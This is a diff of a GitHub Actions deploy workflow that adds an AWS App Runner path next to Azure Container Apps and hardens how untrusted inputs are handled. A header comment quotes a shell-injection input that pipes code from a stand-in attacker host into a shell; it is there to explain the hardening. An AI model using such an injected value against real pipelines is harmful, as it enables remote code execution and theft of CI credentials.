@@ -1,19 +1,12 @@
 # .github/workflows/deploy-agent.yml
 #
-# v5: Region-aware deploy. Triggered by the marketplace via workflow_dispatch
-# with target_region input. Resolves resource group and env from that.
+# v6.10 — Multi-cloud deploy with hardened input handling.
 #
-# Required GitHub repo SECRETS:
-#   AZURE_CLIENT_ID, AZURE_TENANT_ID, AZURE_SUBSCRIPTION_ID
-#
-# Required GitHub repo VARIABLES:
-#   ACR_LOGIN_SERVER                 (shared UAE registry)
-#   CONTAINER_ENV_ID                 (UAE env)
-#   PLATFORM_IDENTITY_ID             (UAE identity)
-#   PLATFORM_KEYVAULT_URI            (UAE KV uri)
-#   CONTAINER_ENV_ID_UKSOUTH         (UK env)
-#   PLATFORM_IDENTITY_ID_UKSOUTH     (UK identity)
-#   PLATFORM_KEYVAULT_URI_UKSOUTH    (UK KV uri)
+# SECURITY: All workflow_dispatch inputs are passed through env vars rather
+# than `${{ inputs.* }}` interpolation in shell. Direct interpolation lets a
+# crafted input like  '; curl evil.com | sh; '  break out of the shell
+# context and execute on the runner. Env-var indirection neutralizes that.
+# See: https://securitylab.github.com/research/github-actions-untrusted-input/
 
 name: RFP Agent — Build & Deploy
 
@@ -22,10 +15,18 @@ on:
     branches: [ main ]
   workflow_dispatch:
     inputs:
+      target_cloud:
+        description: 'Target cloud (azure | aws)'
+        required: false
+        default: 'azure'
+        type: choice
+        options: [azure, aws]
       target_region:
-        description: 'Azure region (uaenorth | uksouth)'
+        description: 'Region (uaenorth | uksouth | me-central-1 | me-south-1)'
         required: false
         default: 'uaenorth'
+        type: choice
+        options: [uaenorth, uksouth, me-central-1, me-south-1]
       tenant_slug:
         description: 'Tenant slug (lowercase, alphanumeric + hyphens)'
         required: false
@@ -49,73 +50,127 @@ jobs:
   resolve-target:
     runs-on: ubuntu-latest
     outputs:
-      region:        ${{ steps.resolve.outputs.region }}
-      resource_group: ${{ steps.resolve.outputs.resource_group }}
-      env_id:        ${{ steps.resolve.outputs.env_id }}
-      identity_id:   ${{ steps.resolve.outputs.identity_id }}
-      kv_uri:        ${{ steps.resolve.outputs.kv_uri }}
-      container_app: ${{ steps.resolve.outputs.container_app }}
+      cloud:          ${{ steps.r.outputs.cloud }}
+      region:         ${{ steps.r.outputs.region }}
+      container_app:  ${{ steps.r.outputs.container_app }}
+      resource_group: ${{ steps.r.outputs.resource_group }}
+      env_id:         ${{ steps.r.outputs.env_id }}
+      identity_id:    ${{ steps.r.outputs.identity_id }}
+      kv_uri:         ${{ steps.r.outputs.kv_uri }}
+      ecr_repo:       ${{ steps.r.outputs.ecr_repo }}
+      apprunner_svc:  ${{ steps.r.outputs.apprunner_svc }}
     steps:
-      - name: Resolve target region
-        id: resolve
+      - name: Resolve target
+        id: r
+        env:
+          # All untrusted inputs go through env first — never interpolate
+          # ${{ inputs.* }} directly into shell.
+          INPUT_CLOUD:  ${{ inputs.target_cloud || 'azure' }}
+          INPUT_REGION: ${{ inputs.target_region || 'uaenorth' }}
+          INPUT_SLUG:   ${{ inputs.tenant_slug }}
+          AGENT_ID:     ${{ env.AGENT_ID }}
+          # Trusted vars (set by repo admins, not workflow callers)
+          ENV_ID_UAE:    ${{ vars.CONTAINER_ENV_ID }}
+          ENV_ID_UK:     ${{ vars.CONTAINER_ENV_ID_UKSOUTH }}
+          IDENT_UAE:     ${{ vars.PLATFORM_IDENTITY_ID }}
+          IDENT_UK:      ${{ vars.PLATFORM_IDENTITY_ID_UKSOUTH }}
+          KV_UAE:        ${{ vars.PLATFORM_KEYVAULT_URI }}
+          KV_UK:         ${{ vars.PLATFORM_KEYVAULT_URI_UKSOUTH }}
         run: |
-          REGION="${{ inputs.target_region || 'uaenorth' }}"
-          SLUG="${{ inputs.tenant_slug }}"
+          set -euo pipefail
 
-          # Container app name: rfp-agent or rfp-agent-<slug>
+          # Strict-validate every input against an allow-list before use.
+          case "$INPUT_CLOUD" in
+            azure|aws) CLOUD="$INPUT_CLOUD" ;;
+            *) echo "::error::Invalid target_cloud: $INPUT_CLOUD"; exit 1 ;;
+          esac
+          case "$INPUT_REGION" in
+            uaenorth|uksouth|me-central-1|me-south-1) REGION="$INPUT_REGION" ;;
+            *) echo "::error::Invalid target_region: $INPUT_REGION"; exit 1 ;;
+          esac
+          # Slug: lowercase alnum + hyphen only, max 24 chars. Reject anything else.
+          SLUG="$(echo "$INPUT_SLUG" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9-' | cut -c1-24)"
+
           if [ -n "$SLUG" ]; then
-            APP_NAME="${{ env.AGENT_ID }}-${SLUG}"
+            APP_NAME="${AGENT_ID}-${SLUG}"
           else
-            APP_NAME="${{ env.AGENT_ID }}"
+            APP_NAME="${AGENT_ID}"
           fi
 
-          echo "region=$REGION"             >> "$GITHUB_OUTPUT"
-          echo "container_app=$APP_NAME"    >> "$GITHUB_OUTPUT"
+          {
+            echo "cloud=$CLOUD"
+            echo "region=$REGION"
+            echo "container_app=$APP_NAME"
+          } >> "$GITHUB_OUTPUT"
 
-          if [ "$REGION" = "uksouth" ]; then
-            echo "resource_group=ai-platform-rg-uksouth"                     >> "$GITHUB_OUTPUT"
-            echo "env_id=${{ vars.CONTAINER_ENV_ID_UKSOUTH }}"               >> "$GITHUB_OUTPUT"
-            echo "identity_id=${{ vars.PLATFORM_IDENTITY_ID_UKSOUTH }}"      >> "$GITHUB_OUTPUT"
-            echo "kv_uri=${{ vars.PLATFORM_KEYVAULT_URI_UKSOUTH }}"          >> "$GITHUB_OUTPUT"
+          if [ "$CLOUD" = "aws" ]; then
+            {
+              echo "ecr_repo=agentos/${AGENT_ID}"
+              echo "apprunner_svc=agentos-${APP_NAME}"
+              echo "resource_group="
+              echo "env_id="
+              echo "identity_id="
+              echo "kv_uri="
+            } >> "$GITHUB_OUTPUT"
+            echo "::notice::Deploying to AWS App Runner: $APP_NAME in $REGION"
           else
-            echo "resource_group=ai-platform-rg"                             >> "$GITHUB_OUTPUT"
-            echo "env_id=${{ vars.CONTAINER_ENV_ID }}"                       >> "$GITHUB_OUTPUT"
-            echo "identity_id=${{ vars.PLATFORM_IDENTITY_ID }}"              >> "$GITHUB_OUTPUT"
-            echo "kv_uri=${{ vars.PLATFORM_KEYVAULT_URI }}"                  >> "$GITHUB_OUTPUT"
+            if [ "$REGION" = "uksouth" ]; then
+              {
+                echo "resource_group=ai-platform-rg-uksouth"
+                echo "env_id=$ENV_ID_UK"
+                echo "identity_id=$IDENT_UK"
+                echo "kv_uri=$KV_UK"
+              } >> "$GITHUB_OUTPUT"
+            else
+              {
+                echo "resource_group=ai-platform-rg"
+                echo "env_id=$ENV_ID_UAE"
+                echo "identity_id=$IDENT_UAE"
+                echo "kv_uri=$KV_UAE"
+              } >> "$GITHUB_OUTPUT"
+            fi
+            {
+              echo "ecr_repo="
+              echo "apprunner_svc="
+            } >> "$GITHUB_OUTPUT"
+            echo "::notice::Deploying to Azure Container Apps: $APP_NAME in $REGION"
           fi
 
-          echo "::notice::Deploying to $APP_NAME in $REGION"
-
-  build:
+  # ══════════════════════════════════════════════════════════════════════════
+  # AZURE PATH — Container Apps + ACR
+  # ══════════════════════════════════════════════════════════════════════════
+  build-azure:
     needs: resolve-target
+    if: needs.resolve-target.outputs.cloud == 'azure'
     runs-on: ubuntu-latest
     outputs:
       image: ${{ steps.meta.outputs.image }}
     steps:
       - uses: actions/checkout@v4
-
       - uses: azure/login@v2
         with:
           client-id:       ${{ secrets.AZURE_CLIENT_ID }}
           tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
           subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
-
       - name: Build image in shared ACR
         id: meta
+        env:
+          ACR_LOGIN_SERVER: ${{ vars.ACR_LOGIN_SERVER }}
+          AGENT_ID: ${{ env.AGENT_ID }}
+          IMAGE_TAG: ${{ env.IMAGE_TAG }}
         run: |
-          ACR_NAME="$(echo '${{ vars.ACR_LOGIN_SERVER }}' | cut -d. -f1)"
-          IMAGE="${{ vars.ACR_LOGIN_SERVER }}/${{ env.AGENT_ID }}:${{ env.IMAGE_TAG }}"
-
+          set -euo pipefail
+          ACR_NAME="$(echo "$ACR_LOGIN_SERVER" | cut -d. -f1)"
+          IMAGE="$ACR_LOGIN_SERVER/$AGENT_ID:$IMAGE_TAG"
           az acr build \
             --registry "$ACR_NAME" \
-            --image "${{ env.AGENT_ID }}:${{ env.IMAGE_TAG }}" \
-            --image "${{ env.AGENT_ID }}:latest" \
-            .
-
+            --image "$AGENT_ID:$IMAGE_TAG" \
+            --image "$AGENT_ID:latest" .
           echo "image=$IMAGE" >> "$GITHUB_OUTPUT"
 
-  deploy:
-    needs: [resolve-target, build]
+  deploy-azure:
+    needs: [resolve-target, build-azure]
+    if: needs.resolve-target.outputs.cloud == 'azure'
     runs-on: ubuntu-latest
     steps:
       - uses: azure/login@v2
@@ -123,57 +178,55 @@ jobs:
           client-id:       ${{ secrets.AZURE_CLIENT_ID }}
           tenant-id:       ${{ secrets.AZURE_TENANT_ID }}
           subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
-
       - name: Update or create Container App
+        env:
+          APP:    ${{ needs.resolve-target.outputs.container_app }}
+          RG:     ${{ needs.resolve-target.outputs.resource_group }}
+          IMAGE:  ${{ needs.build-azure.outputs.image }}
+          ENV_ID: ${{ needs.resolve-target.outputs.env_id }}
+          IDENT:  ${{ needs.resolve-target.outputs.identity_id }}
+          ACR_LOGIN_SERVER: ${{ vars.ACR_LOGIN_SERVER }}
+          REGION: ${{ needs.resolve-target.outputs.region }}
+          KV_URI: ${{ needs.resolve-target.outputs.kv_uri }}
+          AGENT_ID: ${{ env.AGENT_ID }}
+          # Untrusted; already validated above into a safe charset
+          INPUT_SLUG: ${{ inputs.tenant_slug }}
         run: |
-          set -e
-          APP="${{ needs.resolve-target.outputs.container_app }}"
-          RG="${{ needs.resolve-target.outputs.resource_group }}"
-          IMAGE="${{ needs.build.outputs.image }}"
-
+          set -euo pipefail
+          # Re-sanitize defensively (the resolve job validated, but env
+          # vars cross job boundaries via Actions outputs — re-validate).
+          SAFE_SLUG="$(echo "$INPUT_SLUG" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9-' | cut -c1-24)"
           if az containerapp show --name "$APP" --resource-group "$RG" >/dev/null 2>&1; then
             echo "→ Container App exists — updating image"
             az containerapp update --no-wait \
-              --name "$APP" \
-              --resource-group "$RG" \
-              --image "$IMAGE"
+              --name "$APP" --resource-group "$RG" --image "$IMAGE"
           else
             echo "→ Creating new Container App"
             az containerapp create --no-wait \
-              --name "$APP" \
-              --resource-group "$RG" \
-              --environment "${{ needs.resolve-target.outputs.env_id }}" \
+              --name "$APP" --resource-group "$RG" \
+              --environment "$ENV_ID" \
               --image "$IMAGE" \
-              --target-port 3010 \
-              --ingress external \
-              --transport auto \
-              --min-replicas 1 \
-              --max-replicas 5 \
-              --cpu 0.5 \
-              --memory 1.0Gi \
-              --user-assigned "${{ needs.resolve-target.outputs.identity_id }}" \
-              --registry-server "${{ vars.ACR_LOGIN_SERVER }}" \
-              --registry-identity "${{ needs.resolve-target.outputs.identity_id }}" \
+              --target-port 3010 --ingress external --transport auto \
+              --min-replicas 1 --max-replicas 5 --cpu 0.5 --memory 1.0Gi \
+              --user-assigned "$IDENT" \
+              --registry-server "$ACR_LOGIN_SERVER" \
+              --registry-identity "$IDENT" \
               --env-vars \
-                AGENT_ID="${{ env.AGENT_ID }}" \
-                NODE_ENV=production \
-                PORT=3010 \
-                TENANT_SLUG="${{ inputs.tenant_slug }}" \
-                TARGET_REGION="${{ needs.resolve-target.outputs.region }}" \
-                PLATFORM_KEYVAULT_URI="${{ needs.resolve-target.outputs.kv_uri }}"
+                AGENT_ID="$AGENT_ID" NODE_ENV=production PORT=3010 \
+                TENANT_SLUG="$SAFE_SLUG" \
+                TARGET_REGION="$REGION" \
+                TARGET_CLOUD=azure \
+                PLATFORM_KEYVAULT_URI="$KV_URI"
           fi
-
       - name: Wait for revision to become healthy
+        env:
+          APP: ${{ needs.resolve-target.outputs.container_app }}
+          RG:  ${{ needs.resolve-target.outputs.resource_group }}
         run: |
-          set -e
-          APP="${{ needs.resolve-target.outputs.container_app }}"
-          RG="${{ needs.resolve-target.outputs.resource_group }}"
-
+          set -euo pipefail
           for i in $(seq 1 40); do
-            STATE=$(az containerapp show --name "$APP" --resource-group "$RG" \
-              --query "properties.runningStatus" -o tsv 2>/dev/null || echo "Unknown")
-            HEALTH=$(az containerapp revision list --name "$APP" --resource-group "$RG" \
-              --query "[?properties.active].properties.healthState | [0]" -o tsv 2>/dev/null || echo "")
+            STATE=$(az containerapp show --name "$APP" --resource-group "$RG" --query "properties.runningStatus" -o tsv 2>/dev/null || echo "Unknown")
+            HEALTH=$(az containerapp revision list --name "$APP" --resource-group "$RG" --query "[?properties.active].properties.healthState | [0]" -o tsv 2>/dev/null || echo "")
             echo "  poll $i: running=$STATE health=$HEALTH"
             if [ "$STATE" = "Running" ] && [ "$HEALTH" = "Healthy" ]; then
               echo "✓ Container App healthy"
@@ -181,11 +234,153 @@ jobs:
             fi
             sleep 6
           done
+      - name: Report URL
+        env:
+          APP: ${{ needs.resolve-target.outputs.container_app }}
+          RG:  ${{ needs.resolve-target.outputs.resource_group }}
+        run: |
+          set -euo pipefail
+          FQDN=$(az containerapp show --name "$APP" --resource-group "$RG" --query "properties.configuration.ingress.fqdn" -o tsv)
+          echo "::notice::$APP live at https://$FQDN"
+
+  # ══════════════════════════════════════════════════════════════════════════
+  # AWS PATH — App Runner + ECR  (OIDC-only, no static AWS keys)
+  # ══════════════════════════════════════════════════════════════════════════
+  build-aws:
+    needs: resolve-target
+    if: needs.resolve-target.outputs.cloud == 'aws'
+    runs-on: ubuntu-latest
+    outputs:
+      image_uri: ${{ steps.push.outputs.image_uri }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume:    ${{ vars.AWS_DEPLOYER_ROLE_ARN }}
+          aws-region:        ${{ needs.resolve-target.outputs.region }}
+          role-session-name: agentos-deploy-${{ github.run_id }}
+      - name: Login to Amazon ECR
+        id: ecr
+        uses: aws-actions/amazon-ecr-login@v2
+      - name: Build and push image to ECR
+        id: push
+        env:
+          REGISTRY:  ${{ steps.ecr.outputs.registry }}
+          REPO:      ${{ needs.resolve-target.outputs.ecr_repo }}
+          TAG:       ${{ env.IMAGE_TAG }}
+        run: |
+          set -euo pipefail
+          IMAGE_URI="$REGISTRY/$REPO:$TAG"
+          IMAGE_LATEST="$REGISTRY/$REPO:latest"
+          aws ecr describe-repositories --repository-names "$REPO" >/dev/null 2>&1 || \
+            aws ecr create-repository --repository-name "$REPO" \
+              --image-scanning-configuration scanOnPush=true >/dev/null
+          docker build -t "$IMAGE_URI" -t "$IMAGE_LATEST" .
+          docker push "$IMAGE_URI"
+          docker push "$IMAGE_LATEST"
+          echo "image_uri=$IMAGE_URI" >> "$GITHUB_OUTPUT"
+
+  deploy-aws:
+    needs: [resolve-target, build-aws]
+    if: needs.resolve-target.outputs.cloud == 'aws'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume:    ${{ vars.AWS_DEPLOYER_ROLE_ARN }}
+          aws-region:        ${{ needs.resolve-target.outputs.region }}
+          role-session-name: agentos-deploy-${{ github.run_id }}
+      - name: Update or create App Runner service
+        id: deploy
+        env:
+          SVC:     ${{ needs.resolve-target.outputs.apprunner_svc }}
+          REGION:  ${{ needs.resolve-target.outputs.region }}
+          IMAGE:   ${{ needs.build-aws.outputs.image_uri }}
+          ACCESS_ROLE: ${{ vars.AWS_APPRUNNER_ROLE_ARN }}
+          AGENT_ID: ${{ env.AGENT_ID }}
+          INPUT_SLUG: ${{ inputs.tenant_slug }}
+        run: |
+          set -euo pipefail
+          SAFE_SLUG="$(echo "$INPUT_SLUG" | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9-' | cut -c1-24)"
+
+          ARN=$(aws apprunner list-services --region "$REGION" \
+            --query "ServiceSummaryList[?ServiceName=='$SVC'].ServiceArn | [0]" \
+            --output text 2>/dev/null || echo "None")
+
+          # Build SourceConfiguration JSON via jq to avoid string-interpolating
+          # untrusted values into JSON (where a quote in slug could break out).
+          SOURCE_CFG=$(jq -nc \
+            --arg image "$IMAGE" \
+            --arg agent "$AGENT_ID" \
+            --arg slug "$SAFE_SLUG" \
+            --arg region "$REGION" \
+            --arg accrole "$ACCESS_ROLE" \
+            '{
+              ImageRepository: {
+                ImageIdentifier: $image,
+                ImageRepositoryType: "ECR",
+                ImageConfiguration: {
+                  Port: "3010",
+                  RuntimeEnvironmentVariables: {
+                    AGENT_ID: $agent,
+                    NODE_ENV: "production",
+                    PORT: "3010",
+                    TENANT_SLUG: $slug,
+                    TARGET_REGION: $region,
+                    TARGET_CLOUD: "aws"
+                  }
+                }
+              },
+              AutoDeploymentsEnabled: false,
+              AuthenticationConfiguration: {
+                AccessRoleArn: $accrole
+              }
+            }')
+
+          if [ "$ARN" != "None" ] && [ -n "$ARN" ]; then
+            echo "→ App Runner service exists — updating image"
+            aws apprunner update-service --region "$REGION" \
+              --service-arn "$ARN" \
+              --source-configuration "$SOURCE_CFG"
+          else
+            echo "→ Creating new App Runner service"
+            aws apprunner create-service --region "$REGION" \
+              --service-name "$SVC" \
+              --source-configuration "$SOURCE_CFG" \
+              --instance-configuration 'Cpu="0.5 vCPU",Memory="1 GB"' \
+              --health-check-configuration 'Protocol=TCP,Interval=10,Timeout=5,HealthyThreshold=1,UnhealthyThreshold=5'
+            ARN=$(aws apprunner list-services --region "$REGION" \
+              --query "ServiceSummaryList[?ServiceName=='$SVC'].ServiceArn | [0]" --output text)
+          fi
+          echo "service_arn=$ARN" >> "$GITHUB_OUTPUT"
+
+      - name: Wait for App Runner service to be RUNNING
+        env:
+          ARN:    ${{ steps.deploy.outputs.service_arn }}
+          REGION: ${{ needs.resolve-target.outputs.region }}
+        run: |
+          set -euo pipefail
+          for i in $(seq 1 40); do
+            STATE=$(aws apprunner describe-service --region "$REGION" --service-arn "$ARN" \
+              --query "Service.Status" --output text 2>/dev/null || echo "UNKNOWN")
+            echo "  poll $i: status=$STATE"
+            if [ "$STATE" = "RUNNING" ]; then
+              echo "✓ App Runner service running"; break
+            fi
+            if [[ "$STATE" =~ ^(CREATE_FAILED|DELETE_FAILED|PAUSED)$ ]]; then
+              echo "::error::App Runner deploy failed: $STATE"; exit 1
+            fi
+            sleep 8
+          done
 
       - name: Report URL
+        env:
+          ARN:    ${{ steps.deploy.outputs.service_arn }}
+          REGION: ${{ needs.resolve-target.outputs.region }}
         run: |
-          APP="${{ needs.resolve-target.outputs.container_app }}"
-          RG="${{ needs.resolve-target.outputs.resource_group }}"
-          FQDN=$(az containerapp show --name "$APP" --resource-group "$RG" \
-            --query "properties.configuration.ingress.fqdn" -o tsv)
-          echo "::notice::$APP live at https://$FQDN"
+          set -euo pipefail
+          URL=$(aws apprunner describe-service --region "$REGION" --service-arn "$ARN" \
+            --query "Service.ServiceUrl" --output text)
+          echo "::notice::App Runner service live at https://$URL"
